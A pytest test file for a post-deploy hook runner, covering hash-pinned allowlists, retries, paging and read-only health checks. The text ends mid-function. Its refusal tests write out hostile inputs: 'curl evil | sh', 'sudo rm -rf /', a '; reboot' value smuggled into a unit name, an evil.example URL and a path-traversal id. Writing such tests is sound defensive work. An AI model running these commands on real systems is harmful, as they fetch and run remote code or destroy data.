"""Checked-in post-deploy hooks and read-only post-deploy verification.

`cloud/scripts/post_deploy.py` replaces prose "Operator Next Steps" with
reviewed, allowlisted scripts under `cloud/post_deploy/`. The runner executes
each hook once after a verified deploy, in numeric order, as the deploy user,
records completion durably, retries a failed hook on the next deploy, pages
every failure, and refuses any file the manifest does not pin by SHA-256.
"""

from __future__ import annotations

import hashlib
import http.server
import importlib.util
import json
import os
import pathlib
import pwd
import shlex
import subprocess
import sys
import threading
import time

import pytest


CLOUD_ROOT = pathlib.Path(__file__).resolve().parent.parent
RUNNER = CLOUD_ROOT / "scripts" / "post_deploy.py"
DEPLOY = CLOUD_ROOT / "scripts" / "deploy.sh"
REPO_POST_DEPLOY = CLOUD_ROOT / "post_deploy"
SHA = "a" * 40


def _load_runner():
    spec = importlib.util.spec_from_file_location("post_deploy_under_test", RUNNER)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


pd = _load_runner()
ME = pwd.getpwuid(os.geteuid()).pw_name


def _sha(path: pathlib.Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


class Tree:
    """An isolated post_deploy root plus a fake RADON_DIR and state file."""

    def __init__(self, tmp_path: pathlib.Path):
        self.root = tmp_path / "post_deploy"
        self.hooks_dir = self.root / "hooks"
        self.hooks_dir.mkdir(parents=True)
        os.chmod(self.root, 0o755)
        os.chmod(self.hooks_dir, 0o755)
        self.radon_dir = tmp_path / "radon"
        self.radon_dir.mkdir()
        self.state = tmp_path / "state" / "post-deploy.json"
        self.env_file = tmp_path / "env"
        self.env_file.write_text("PUSHOVER_USER=u\nPUSHOVER_TOKEN=t\nTURSO_AUTH_TOKEN=secret\n")
        self.hooks: list[dict] = []
        self.verify: list[dict] = []
        self.pages: list[tuple[str, str]] = []
        self.write_manifest()

    def add_hook(self, hook_id: str, body: str, *, ext: str = ".sh", pin: bool = True, **extra):
        path = self.hooks_dir / f"{hook_id}{ext}"
        path.write_text(body)
        os.chmod(path, 0o755)
        if pin:
            entry = {"id": hook_id, "sha256": _sha(path), "description": f"test {hook_id}"}
            entry.update(extra)
            self.hooks.append(entry)
            self.write_manifest()
        return path

    def log_hook(self, hook_id: str, extra: str = "") -> pathlib.Path:
        return self.add_hook(
            hook_id,
            f'#!/bin/bash\nset -euo pipefail\n{extra}\nprintf "%s\\n" "{hook_id}" >> "$RADON_DIR/order.log"\n',
        )

    def write_manifest(self):
        path = self.root / "manifest.json"
        path.write_text(json.dumps({"version": 1, "hooks": self.hooks, "verify": self.verify}, indent=2))
        os.chmod(path, 0o644)

    def order(self) -> list[str]:
        log = self.radon_dir / "order.log"
        return log.read_text().split() if log.exists() else []

    def read_state(self) -> dict:
        return json.loads(self.state.read_text())

    def pager(self, title: str, message: str) -> str | None:
        self.pages.append((title, message))
        return None

    def hook_ctx(self, **overrides):
        values = dict(
            radon_dir=self.radon_dir,
            deploy_sha=SHA,
            env_file=self.env_file,
            python=pathlib.Path(sys.executable),
            budget_seconds=60,
        )
        values.update(overrides)
        return pd.HookContext(**values)

    def run_hooks(self, **overrides) -> int:
        manifest = pd.load_manifest(self.root)
        hooks = pd.validate_tree(self.root, manifest, euid=os.geteuid())
        return pd.run_hooks(hooks, state_path=self.state, ctx=self.hook_ctx(**overrides), pager=self.pager)

    def run_all(self, **kwargs) -> int:
        return pd.run(
            root=self.root,
            state_path=self.state,
            hook_ctx=self.hook_ctx(),
            verify_ctx=kwargs.pop("verify_ctx", pd.VerifyContext()),
            expect_user=kwargs.pop("expect_user", ME),
            pager=self.pager,
            **kwargs,
        )


@pytest.fixture
def tree(tmp_path):
    return Tree(tmp_path)


# -- ordering and once-only ---------------------------------------------------


def test_hooks_run_in_numeric_order_regardless_of_manifest_order(tree):
    tree.log_hook("0010-third")
    tree.log_hook("0002-second")
    tree.log_hook("0001-first")
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-first", "0002-second", "0010-third"]
    assert tree.pages == []


def test_completed_hook_never_runs_again(tree):
    tree.log_hook("0001-once")
    assert tree.run_hooks() == 0
    assert tree.run_hooks() == 0
    assert tree.run_hooks(deploy_sha="b" * 40) == 0
    assert tree.order() == ["0001-once"]
    record = tree.read_state()["hooks"]["0001-once"]
    assert record["status"] == "done"
    assert record["attempts"] == 1
    assert record["deploy_sha"] == SHA
    assert record["sha256"] == _sha(tree.hooks_dir / "0001-once.sh")


def test_new_hook_added_later_runs_without_rerunning_old_ones(tree):
    tree.log_hook("0001-old")
    assert tree.run_hooks() == 0
    tree.log_hook("0002-new")
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-old", "0002-new"]


def test_state_is_written_atomically_with_private_mode(tree):
    tree.log_hook("0001-once")
    tree.run_hooks()
    assert oct(tree.state.stat().st_mode & 0o777) == "0o600"
    assert [p.name for p in tree.state.parent.iterdir() if p.name.startswith(".")] == []


def test_completed_hook_whose_content_changed_is_reported_not_rerun(tree):
    path = tree.log_hook("0001-once")
    assert tree.run_hooks() == 0
    path.write_text(path.read_text() + "# edited after it ran\n")
    tree.hooks[0]["sha256"] = _sha(path)
    tree.write_manifest()
    assert tree.run_hooks() == 1
    assert tree.order() == ["0001-once"]
    assert tree.pages and "0001-once" in tree.pages[0][1]
    assert "changed after it completed" in tree.pages[0][1]


# -- failure and retry --------------------------------------------------------


def test_failed_hook_stops_later_hooks_is_paged_and_retried_next_deploy(tree):
    tree.log_hook("0001-flaky", extra='[[ -f "$RADON_DIR/fixed" ]] || { echo boom >&2; exit 3; }')
    tree.log_hook("0002-after")
    assert tree.run_hooks() == 1
    assert tree.order() == []
    state = tree.read_state()["hooks"]
    assert state["0001-flaky"]["status"] == "failed"
    assert state["0001-flaky"]["attempts"] == 1
    assert "exit 3" in state["0001-flaky"]["last_error"]
    assert "boom" in state["0001-flaky"]["last_error"]
    assert "0002-after" not in state
    assert len(tree.pages) == 1
    assert "0001-flaky" in tree.pages[0][1]

    # Next deploy: still failing -> retried, paged again.
    assert tree.run_hooks() == 1
    assert tree.read_state()["hooks"]["0001-flaky"]["attempts"] == 2
    assert len(tree.pages) == 2

    (tree.radon_dir / "fixed").write_text("")
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-flaky", "0002-after"]
    state = tree.read_state()["hooks"]
    assert state["0001-flaky"]["status"] == "done"
    assert state["0001-flaky"]["attempts"] == 3
    assert len(tree.pages) == 2


def _seed_running(tree, hook_id: str) -> None:
    """A runner killed mid-hook leaves `running`; the next runner holds the
    lock, so that record can only belong to a dead run."""
    tree.state.parent.mkdir(parents=True)
    tree.state.write_text(json.dumps({
        "version": 1,
        "hooks": {hook_id: {
            "status": "running", "attempts": 1, "sha256": "x",
            "started_at": "2026-11-03T00:00:00Z",
        }},
    }))


def test_interrupted_idempotent_hook_is_rerun(tree):
    tree.add_hook(
        "0001-interrupted",
        '#!/bin/bash\nprintf "%s\\n" 0001-interrupted >> "$RADON_DIR/order.log"\n',
        idempotent=True,
    )
    _seed_running(tree, "0001-interrupted")
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-interrupted"]
    record = tree.read_state()["hooks"]["0001-interrupted"]
    assert record["status"] == "done"
    assert record["attempts"] == 2


def test_interrupted_hook_without_idempotent_flag_is_paged_not_rerun(tree):
    tree.log_hook("0001-interrupted")
    tree.log_hook("0002-later")
    _seed_running(tree, "0001-interrupted")

    assert tree.run_hooks() == 1
    assert tree.order() == [], "neither the interrupted hook nor a later one may run"
    record = tree.read_state()["hooks"]["0001-interrupted"]
    assert record["status"] == "interrupted"
    assert record["attempts"] == 1
    assert record["started_at"] == "2026-11-03T00:00:00Z"
    assert len(tree.pages) == 1
    assert "0001-interrupted" in tree.pages[0][1]
    assert "idempotent" in tree.pages[0][1]

    # Still blocked and still paged on the next deploy: nothing reruns it
    # until a reviewed manifest change declares it idempotent or retires it.
    assert tree.run_hooks(deploy_sha="b" * 40) == 1
    assert tree.order() == []
    assert len(tree.pages) == 2


def test_interrupted_hook_reruns_once_manifest_declares_it_idempotent(tree):
    tree.log_hook("0001-interrupted")
    _seed_running(tree, "0001-interrupted")
    assert tree.run_hooks() == 1
    tree.hooks[0]["idempotent"] = True
    tree.write_manifest()
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-interrupted"]
    assert tree.read_state()["hooks"]["0001-interrupted"]["status"] == "done"


@pytest.mark.parametrize("value", ["yes", 1, None])
def test_idempotent_flag_must_be_a_boolean(tree, value):
    tree.log_hook("0001-any")
    tree.hooks[0]["idempotent"] = value
    tree.write_manifest()
    with pytest.raises(pd.Refusal, match="idempotent"):
        pd.load_manifest(tree.root)


def test_hook_timeout_kills_process_group_and_records_failure(tree):
    tree.add_hook(
        "0001-slow",
        '#!/bin/bash\n(sleep 30; touch "$RADON_DIR/orphan") &\nsleep 30\n',
        timeout_seconds=1,
    )
    started = time.monotonic()
    assert tree.run_hooks() == 1
    assert time.monotonic() - started < 15
    record = tree.read_state()["hooks"]["0001-slow"]
    assert record["status"] == "failed"
    assert "timed out" in record["last_error"]
    time.sleep(0.5)
    assert not (tree.radon_dir / "orphan").exists()


def test_hook_that_cannot_start_is_recorded_failed_and_paged(tree):
    """A missing interpreter used to raise out of the runner: no page, and the
    record stayed `running` until some later deploy."""
    tree.add_hook("0001-py", "print('hi')\n", ext=".py")
    assert tree.run_hooks(python=tree.radon_dir / "missing-python") == 1
    record = tree.read_state()["hooks"]["0001-py"]
    assert record["status"] == "failed"
    assert "could not start" in record["last_error"]
    assert len(tree.pages) == 1 and "0001-py" in tree.pages[0][1]


def test_unexpected_runner_error_is_paged_not_swallowed(tree, monkeypatch):
    def boom(*_args, **_kwargs):
        raise RuntimeError("disk on fire")

    tree.log_hook("0001-any")
    monkeypatch.setattr(pd, "run_hooks", boom)
    assert tree.run_all() == 1
    assert len(tree.pages) == 1
    assert tree.pages[0][0] == "radon post-deploy crashed"
    assert "disk on fire" in tree.pages[0][1]


def test_budget_exhaustion_defers_remaining_hooks_and_pages(tree):
    tree.log_hook("0001-first")
    tree.log_hook("0002-second")
    assert tree.run_hooks(budget_seconds=0) == 1
    assert tree.order() == []
    assert "budget" in tree.pages[0][1]
    assert tree.run_hooks() == 0
    assert tree.order() == ["0001-first", "0002-second"]


def test_corrupt_state_refuses_instead_of_rerunning_everything(tree):
    tree.log_hook("0001-once")
    tree.state.parent.mkdir(parents=True)
    tree.state.write_text("{not json")
    with pytest.raises(pd.Refusal, match="state"):
        tree.run_hooks()
    assert tree.order() == []


def test_symlinked_state_file_is_refused(tree, tmp_path):
    tree.log_hook("0001-once")
    tree.state.parent.mkdir(parents=True)
    target = tmp_path / "elsewhere.json"
    target.write_text(json.dumps({"version": 1, "hooks": {}}))
    tree.state.symlink_to(target)
    with pytest.raises(pd.Refusal, match="symlink"):
        tree.run_hooks()


def test_concurrent_runner_is_refused(tree):
    import fcntl

    tree.log_hook("0001-once")
    tree.state.parent.mkdir(parents=True)
    with open(f"{tree.state}.lock", "w") as held:
        fcntl.flock(held, fcntl.LOCK_EX | fcntl.LOCK_NB)
        with pytest.raises(pd.Refusal, match="another post-deploy runner"):
            tree.run_hooks()
    assert tree.order() == []


# -- hook environment ---------------------------------------------------------


def test_hook_gets_documented_env_and_no_inherited_secrets(tree, monkeypatch):
    monkeypatch.setenv("LEAKY_SECRET", "do-not-pass")
    tree.add_hook("0001-env", '#!/bin/bash\nenv > "$RADON_DIR/env.out"\npwd > "$RADON_DIR/pwd.out"\n')
    assert tree.run_hooks() == 0
    env = dict(
        line.split("=", 1) for line in (tree.radon_dir / "env.out").read_text().splitlines() if "=" in line
    )
    assert "LEAKY_SECRET" not in env
    assert "TURSO_AUTH_TOKEN" not in env
    assert env["RADON_DIR"] == str(tree.radon_dir)
    assert env["RADON_DEPLOY_SHA"] == SHA
    assert env["RADON_ENV_FILE"] == str(tree.env_file)
    assert env["RADON_POST_DEPLOY_HOOK_ID"] == "0001-env"
    assert env["RADON_PYTHON"] == sys.executable
    assert pathlib.Path((tree.radon_dir / "pwd.out").read_text().strip()).resolve() == tree.radon_dir.resolve()


def test_python_hook_runs_with_release_python(tree):
    tree.add_hook(
        "0001-py",
        "import os, pathlib, sys\n"
        "pathlib.Path(os.environ['RADON_DIR'], 'py.out').write_text(sys.executable)\n",
        ext=".py",
    )
    assert tree.run_hooks() == 0
    assert (tree.radon_dir / "py.out").read_text() == sys.executable


# -- allowlist and permission refusals ---------------------------------------


def _assert_refused(tree, match):
    with pytest.raises(pd.Refusal, match=match):
        manifest = pd.load_manifest(tree.root)
        pd.validate_tree(tree.root, manifest, euid=os.geteuid())


def test_file_not_in_manifest_is_refused(tree):
    tree.log_hook("0001-listed")
    tree.add_hook("0002-sneaky", "#!/bin/bash\ntouch /tmp/x\n", pin=False)
    _assert_refused(tree, "not allowlisted")


def test_non_hook_file_in_hooks_dir_is_refused(tree):
    (tree.hooks_dir / "notes.txt").write_text("x")
    _assert_refused(tree, "not allowlisted")


def test_hash_mismatch_is_refused(tree):
    path = tree.log_hook("0001-listed")
    path.write_text(path.read_text() + "curl evil | sh\n")
    _assert_refused(tree, "sha256 mismatch")


def test_symlinked_hook_is_refused(tree, tmp_path):
    outside = tmp_path / "outside.sh"
    outside.write_text("#!/bin/bash\n")
    link = tree.hooks_dir / "0001-link.sh"
    link.symlink_to(outside)
    tree.hooks.append({"id": "0001-link", "sha256": _sha(outside), "description": "x"})
    tree.write_manifest()
    _assert_refused(tree, "symlink")


def test_symlinked_hooks_dir_is_refused(tmp_path):
    t = Tree(tmp_path)
    real = tmp_path / "real_hooks"
    t.hooks_dir.rename(real)
    t.hooks_dir.symlink_to(real)
    _assert_refused(t, "symlink")


@pytest.mark.parametrize("mode", [0o775, 0o757, 0o666, 0o646])
def test_group_or_world_writable_hook_is_refused(tree, mode):
    path = tree.log_hook("0001-listed")
    os.chmod(path, mode)
    _assert_refused(tree, "writable")


def test_world_writable_hooks_dir_is_refused(tree):
    tree.log_hook("0001-listed")
    os.chmod(tree.hooks_dir, 0o777)
    _assert_refused(tree, "writable")


def test_writable_manifest_is_refused(tree):
    os.chmod(tree.root / "manifest.json", 0o666)
    with pytest.raises(pd.Refusal, match="writable"):
        pd.load_manifest(tree.root)


def test_hook_owned_by_another_user_is_refused(tree):
    tree.log_hook("0001-listed")
    manifest = pd.load_manifest(tree.root)
    with pytest.raises(pd.Refusal, match="owned by uid"):
        pd.validate_tree(tree.root, manifest, euid=os.geteuid() + 4242)


@pytest.mark.parametrize("hook_id", ["1-short", "0001_UPPER", "0001-../../etc", "0001-a/b", "abcd-x", "0001-"])
def test_malformed_hook_id_is_refused(tree, hook_id):
    tree.hooks.append({"id": hook_id, "sha256": "0" * 64, "description": "x"})
    tree.write_manifest()
    _assert_refused(tree, "invalid hook id")


def test_duplicate_hook_number_is_refused(tree):
    tree.log_hook("0001-a")
    tree.log_hook("0001-b")
    _assert_refused(tree, "duplicate hook number")


def test_unsupported_extension_is_refused(tree):
    tree.add_hook("0001-bin", "x", ext=".rb")
    _assert_refused(tree, "not allowlisted|no hook file")


def test_missing_hook_file_is_refused(tree):
    tree.hooks.append({"id": "0001-gone", "sha256": "0" * 64, "description": "x"})
    tree.write_manifest()
    _assert_refused(tree, "no hook file")


def test_unknown_manifest_keys_and_bad_timeouts_are_refused(tree):
    tree.log_hook("0001-a")
    tree.hooks[0]["run_as"] = "root"
    tree.write_manifest()
    with pytest.raises(pd.Refusal, match="unknown key"):
        pd.load_manifest(tree.root)
    del tree.hooks[0]["run_as"]
    tree.hooks[0]["timeout_seconds"] = 100000
    tree.write_manifest()
    with pytest.raises(pd.Refusal, match="timeout_seconds"):
        pd.load_manifest(tree.root)


def test_refusal_runs_nothing_and_pages(tree):
    tree.log_hook("0001-listed")
    tree.add_hook("0002-sneaky", "#!/bin/bash\n", pin=False)
    assert tree.run_all() == 2
    assert tree.order() == []
    assert not tree.state.exists()
    assert tree.pages and "not allowlisted" in tree.pages[0][1]


def test_runner_refuses_root(tree, monkeypatch):
    tree.log_hook("0001-listed")
    monkeypatch.setattr(pd.os, "geteuid", lambda: 0)
    assert tree.run_all(expect_user="root") == 2
    assert tree.order() == []
    assert "root" in tree.pages[0][1]


def test_runner_refuses_wrong_user(tree):
    tree.log_hook("0001-listed")
    assert tree.run_all(expect_user="radon-not-me") == 2
    assert tree.order() == []
    assert "radon-not-me" in tree.pages[0][1]


def test_empty_manifest_touches_no_state(tree):
    assert tree.run_all() == 0
    assert not tree.state.exists()
    assert tree.pages == []


def test_runner_never_reads_pr_text_or_env_commands(tree, monkeypatch):
    # Only files pinned in the manifest execute. Environment cannot inject a hook.
    monkeypatch.setenv("RADON_POST_DEPLOY_HOOK", "touch /tmp/pwned")
    monkeypatch.setenv("OPERATOR_NEXT_STEPS", "sudo rm -rf /")
    assert tree.run_all() == 0
    assert tree.order() == []
    src = RUNNER.read_text()
    assert "shell=True" not in src
    assert "os.system" not in src


# -- read-only verification ---------------------------------------------------


@pytest.fixture
def fake_bin(tmp_path):
    d = tmp_path / "bin"
    d.mkdir()
    return d


def _script(path: pathlib.Path, body: str) -> pathlib.Path:
    path.write_text("#!/bin/bash\n" + body)
    path.chmod(0o755)
    return path


def _journal_line(ts: float, message) -> str:
    return json.dumps({"__REALTIME_TIMESTAMP": str(int(ts * 1_000_000)), "MESSAGE": message})


def _verify_ctx(fake_bin, *, journal_lines=(), active_units=(), since_epoch=None, **kw):
    journal = fake_bin / "journal.jsonl"
    journal.write_text("\n".join(journal_lines) + "\n")
    _script(fake_bin / "fake-logs", f'echo "$*" >> {fake_bin}/logs.calls\ncat {journal}\n')
    active = " ".join(active_units)
    _script(
        fake_bin / "systemctl",
        f'echo "$*" >> {fake_bin}/systemctl.calls\n'
        f'[[ "$1" == is-active && "$2" == --quiet ]] || exit 9\n'
        f'for u in {active}; do [[ "$3" == "$u" ]] && exit 0; done\nexit 3\n',
    )
    return pd.VerifyContext(
        systemctl=str(fake_bin / "systemctl"),
        journal_cmd=(str(fake_bin / "fake-logs"),),
        since_epoch=since_epoch,
        poll_seconds=kw.pop("poll_seconds", 0.05),
        budget_seconds=kw.pop("budget_seconds", 10),
        **kw,
    )


def test_unit_active_check(fake_bin):
    ctx = _verify_ctx(fake_bin, active_units=["radon-api.service"])
    checks = pd.validate_checks([
        {"id": "api", "type": "unit_active", "unit": "radon-api.service", "description": "x"},
        {"id": "gw", "type": "unit_active", "unit": "radon-model-gateway.service", "description": "x"},
    ])
    failures = pd.run_checks(checks, ctx)
    assert len(failures) == 1 and "gw" in failures[0] and "radon-model-gateway.service" in failures[0]
    calls = (fake_bin / "systemctl.calls").read_text().split("\n")
    assert all(c.startswith("is-active --quiet ") for c in calls if c)


def test_journal_present_and_absent_within_window(fake_bin):
    now = time.time()
    lines = [
        _journal_line(now - 3600, "Traceback old crash"),
        _journal_line(now - 30, "gateway ready on port 80"),
        _journal_line(now - 20, [104, 105]),  # journald byte-array MESSAGE -> "hi"
    ]
    ctx = _verify_ctx(fake_bin, journal_lines=lines)
    checks = pd.validate_checks([
        {"id": "ready", "type": "journal", "unit": "radon-model-gateway.service",
         "pattern": "gateway ready", "expect": "present", "since_minutes": 5, "description": "x"},
        {"id": "no-crash", "type": "journal", "unit": "radon-model-gateway.service",
         "pattern": "Traceback", "expect": "absent", "since_minutes": 10, "description": "x"},
        {"id": "bytes", "type": "journal", "unit": "radon-model-gateway.service",
         "pattern": "^hi$", "expect": "present", "since_minutes": 5, "description": "x"},
    ])
    assert pd.run_checks(checks, ctx) == []
    assert (fake_bin / "logs.calls").read_text().split() == ["radon-model-gateway.service"] * 3


def test_journal_window_never_reaches_before_deploy_start(fake_bin):
    now = time.time()
    lines = [_journal_line(now - 120, "Traceback from the old release")]
    ctx = _verify_ctx(fake_bin, journal_lines=lines, since_epoch=now - 60)
    checks = pd.validate_checks([
        {"id": "no-crash", "type": "journal", "unit": "radon-api.service",
         "pattern": "Traceback", "expect": "absent", "since_minutes": 30, "description": "x"},
    ])
    assert pd.run_checks(checks, ctx) == []
    ctx = _verify_ctx(fake_bin, journal_lines=lines, since_epoch=None)
    failures = pd.run_checks(checks, ctx)
    assert len(failures) == 1 and "no-crash" in failures[0]


def test_journal_present_missing_fails_after_wait(fake_bin):
    ctx = _verify_ctx(fake_bin, journal_lines=[])
    checks = pd.validate_checks([
        {"id": "ready", "type": "journal", "unit": "radon-api.service", "pattern": "ready",
         "expect": "present", "since_minutes": 5, "wait_seconds": 1, "description": "x"},
    ])
    started = time.monotonic()
    failures = pd.run_checks(checks, ctx)
    assert time.monotonic() - started >= 0.9
    assert len(failures) == 1 and "ready" in failures[0]


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        if self.path == "/ok":
            body = b'{"status":"ok"}'
            self.send_response(200)
        else:
            body = b"nope"
            self.send_response(503)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):  # noqa: N802
        raise AssertionError("verification must be read-only")

    def log_message(self, *args):
        pass


@pytest.fixture
def http_port():
    server = http.server.HTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server.server_address[1]
    server.shutdown()


def test_http_check(fake_bin, http_port):
    ctx = _verify_ctx(fake_bin)
    checks = pd.validate_checks([
        {"id": "ok", "type": "http", "url": f"http://127.0.0.1:{http_port}/ok", "contains": '"ok"', "description": "x"},
        {"id": "down", "type": "http", "url": f"http://localhost:{http_port}/down", "description": "x"},
        {"id": "wrong-body", "type": "http", "url": f"http://127.0.0.1:{http_port}/ok", "contains": "nope", "description": "x"},
    ])
    failures = pd.run_checks(checks, ctx)
    assert [f.split(":")[0] for f in failures] == ["down", "wrong-body"]
    assert "503" in failures[0]


@pytest.mark.parametrize(
    "check, match",
    [
        ({"id": "x", "type": "shell", "cmd": "rm -rf /", "description": "x"}, "unknown check type"),
        ({"id": "x", "type": "http", "url": "https://evil.example/", "description": "x"}, "localhost"),
        ({"id": "x", "type": "http", "url": "http://localhost@evil.example:80/", "description": "x"}, "localhost"),
        ({"id": "x", "type": "unit_active", "unit": "sshd.service", "description": "x"}, "unit"),
        ({"id": "x", "type": "unit_active", "unit": "radon-api.service; reboot", "description": "x"}, "unit"),
        ({"id": "x", "type": "journal", "unit": "radon-beta-x.service", "pattern": "a",
          "expect": "absent", "since_minutes": 5, "description": "x"}, "unit"),
        ({"id": "x", "type": "journal", "unit": "radon-api.service", "pattern": "(",
          "expect": "absent", "since_minutes": 5, "description": "x"}, "pattern"),
        ({"id": "x", "type": "journal", "unit": "radon-api.service", "pattern": "a",
          "expect": "maybe", "since_minutes": 5, "description": "x"}, "expect"),
        ({"id": "x", "type": "journal", "unit": "radon-api.service", "pattern": "a",
          "expect": "absent", "since_minutes": 600, "description": "x"}, "since_minutes"),
        ({"id": "x", "type": "unit_active", "unit": "radon-api.service", "wait_seconds": 999,
          "description": "x"}, "wait_seconds"),
        ({"id": "x", "type": "unit_active", "unit": "radon-api.service", "description": "x",
          "exec": "touch /tmp/x"}, "unknown key"),
    ],
)
def test_invalid_checks_are_refused(check, match):
    with pytest.raises(pd.Refusal, match=match):
        pd.validate_checks([check])


def test_duplicate_check_ids_are_refused():
    check = {"id": "x", "type": "unit_active", "unit": "radon-api.service", "description": "x"}
    with pytest.raises(pd.Refusal, match="duplicate check id"):
        pd.validate_checks([check, dict(check)])


def test_verify_runs_every_deploy_and_pages_failures(tree, fake_bin):
    tree.verify = [
        {"id": "api", "type": "unit_active", "unit": "radon-api.service", "description": "x"},
        {"id": "gw", "type": "unit_active", "unit": "radon-model-gateway.service", "description": "x"},
    ]
    tree.write_manifest()
    ctx = _verify_ctx(fake_bin, active_units=["radon-api.service"])
    assert tree.run_all(verify_ctx=ctx) == 1
    assert tree.run_all(verify_ctx=ctx) == 1
    assert len(tree.pages) == 2
    assert all("gw" in message for _, message in tree.pages)
    assert all("verification" in title for title, _ in tree.pages)
    assert len((fake_bin / "systemctl.calls").read_text().split("\n")) - 1 == 4


def test_hook_failure_does_not_skip_verification(tree, fake_bin):
    tree.log_hook("0001-fails", extra="exit 1")
    tree.verify = [{"id": "api", "type": "unit_active", "unit": "radon-api.service", "description": "x"}]
    tree.write_manifest()
    ctx = _verify_ctx(fake_bin, active_units=[])
    assert tree.run_all(verify_ctx=ctx) == 1
    titles = [t for t, _ in tree.pages]
    assert any("hook" in t for t in titles) and any("verification" in t for t in titles)


def test_pager_failure_is_reported_in_exit_status(tree):
    tree.log_hook("0001-fails", extra="exit 1")
    status = pd.run(
        root=tree.root, state_path=tree.state, hook_ctx=tree.hook_ctx(),
        verify_ctx=pd.VerifyContext(), expect_user=ME,
        pager=lambda title, message: "pushover unconfigured",
    )
    assert status == 1


# -- pager --------------------------------------------------------------------


def test_real_pager_uses_watchdog_direct_page_with_only_pushover_creds(tmp_path):
    radon = tmp_path / "radon"
    (radon / "scripts" / "watchdog").mkdir(parents=True)
    (radon / "scripts" / "__init__.py").write_text("")
    (radon / "scripts" / "watchdog" / "__init__.py").write_text("")
    out = tmp_path / "page.json"
    (radon / "scripts" / "watchdog" / "notify.py").write_text(
        "import json, os\n"
        "def send_direct_page(*, title, message, tag):\n"
        f"    open({str(out)!r}, 'w').write(json.dumps({{'title': title, 'message': message, 'tag': tag,"
        " 'env': sorted(k for k in os.environ if 'TOKEN' in k or 'PUSHOVER' in k or 'SECRET' in k),"
        " 'user': os.environ['PUSHOVER_USER']}))\n"
        "    return None\n"
    )
    env_file = tmp_path / "env"
    env_file.write_text("PUSHOVER_USER='u1'\nPUSHOVER_TOKEN=t1\nTURSO_AUTH_TOKEN=nope\nSOME_SECRET=nope\n")
    pager = pd.make_pager(radon_dir=radon, env_file=env_file, python=pathlib.Path(sys.executable))
    assert pager("radon post-deploy hook failed", "0001-x exit 1") is None
    sent = json.loads(out.read_text())
    assert sent["title"] == "radon post-deploy hook failed"
    assert sent["tag"] == "radon-post-deploy"
    assert sent["user"] == "u1"
    assert sent["env"] == ["PUSHOVER_TOKEN", "PUSHOVER_USER"]


def test_real_pager_reports_delivery_failure(tmp_path):
    radon = tmp_path / "radon"
    (radon / "scripts" / "watchdog").mkdir(parents=True)
    (radon / "scripts" / "__init__.py").write_text("")
    (radon / "scripts" / "watchdog" / "__init__.py").write_text("")
    (radon / "scripts" / "watchdog" / "notify.py").write_text(
        "def send_direct_page(*, title, message, tag):\n    return 'pushover 500: down'\n"
    )
    env_file = tmp_path / "env"
    env_file.write_text("")
    pager = pd.make_pager(radon_dir=radon, env_file=env_file, python=pathlib.Path(sys.executable))
    assert "pushover 500" in pager("t", "m")


# -- CLI ----------------------------------------------------------------------


def test_cli_end_to_end_with_page_log(tree, tmp_path):
    tree.log_hook("0001-cli")
    tree.log_hook("0002-fails", extra="exit 4")
    page_log = tmp_path / "pages.jsonl"
    env = {**os.environ, "RADON_POST_DEPLOY_PAGE_LOG": str(page_log)}
    cmd = [
        sys.executable, str(RUNNER), "run",
        "--root", str(tree.root), "--state", str(tree.state),
        "--deploy-sha", SHA, "--radon-dir", str(tree.radon_dir),
        "--env-file", str(tree.env_file), "--python", sys.executable,
        "--expect-user", ME, "--since-epoch", str(int(time.time()) - 60),
    ]
    result = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=60)
    assert result.returncode == 1, result.stdout + result.stderr
    assert tree.order() == ["0001-cli"]
    assert "0002-fails" in result.stdout
    pages = [json.loads(line) for line in page_log.read_text().splitlines()]
    assert len(pages) == 1 and "0002-fails" in pages[0]["message"]


def test_cli_check_validates_repo_manifest():
    result = subprocess.run(
        [sys.executable, str(RUNNER), "check", "--root", str(REPO_POST_DEPLOY)],
        capture_output=True, text=True, timeout=30,
    )
    assert result.returncode == 0, result.stdout + result.stderr


def test_repo_manifest_pins_every_checked_in_hook():
    manifest = pd.load_manifest(REPO_POST_DEPLOY)
    hooks = pd.validate_tree(REPO_POST_DEPLOY, manifest, euid=os.geteuid(), check_owner=False)
    pd.validate_checks(manifest["verify"])
    assert [h.id for h in hooks] == sorted(h["id"] for h in manifest["hooks"])


# -- deploy.sh wiring ---------------------------------------------------------


def _function_body(src: str, name: str) -> str:
    start = src.index(f"\n{name}() {{")
    end = src.index("\n}\n", start)
    return src[start:end]


def test_deploy_runs_post_deploy_only_after_the_supervisor_releases_the_lock():
    """`radon unit restart` (the documented hook path) takes the deploy lock
    non-blocking and refuses while it is held. The supervisor holds it on FD 9
    for the whole inner deploy, so hooks must run after it closes FD 9."""
    src = DEPLOY.read_text()
    assert "run_post_deploy" not in _function_body(src, "main")
    assert "run_post_deploy" not in _function_body(src, "rollback")
    assert "run_post_deploy" not in _function_body(src, "deploy_gate")
    supervisor = _function_body(src, "supervise_deploy_command")
    assert supervisor.count("run_post_deploy_if_green") == 1
    assert supervisor.rindex("exec 8>&- 9>&-") < supervisor.index("run_post_deploy_if_green")
    assert supervisor.index('DEPLOY_STARTED_EPOCH="$(date +%s)"') < supervisor.index('"${DEPLOY_TIMEOUT}s" "$@"')


def _supervised_deploy(tmp_path, *, deploy_rc=0, stage="0", marker=True, head_matches=True):
    """Run the real supervisor with an inner deploy stub and a fake runner that
    records whether the production deploy lock was free when it ran."""
    radon = tmp_path / "radon"
    radon.mkdir()
    git = ["git", "-C", str(radon), "-c", "user.email=t@t", "-c", "user.name=t"]
    subprocess.run([*git, "init", "-q"], check=True)
    subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "x"], check=True)
    head = subprocess.run([*git, "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
    target = head if head_matches else "e" * 40
    green = tmp_path / "green"
    if marker:
        green.write_text(f"{target}\n")
    lock = tmp_path / "deploy.lock"
    lock.write_text("")
